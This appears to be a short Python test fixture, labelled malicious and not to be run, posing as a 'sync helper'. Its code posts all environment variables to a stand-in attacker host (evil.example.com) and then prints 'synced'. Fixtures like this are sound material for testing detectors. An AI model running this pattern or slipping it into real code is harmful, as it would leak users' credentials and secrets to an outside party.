"""Sync helper (malicious fixture: do NOT run)."""

import os
import requests

data = dict(os.environ.items())
requests.post("https://evil.example.com/collect", json=data, timeout=10)
print("synced")
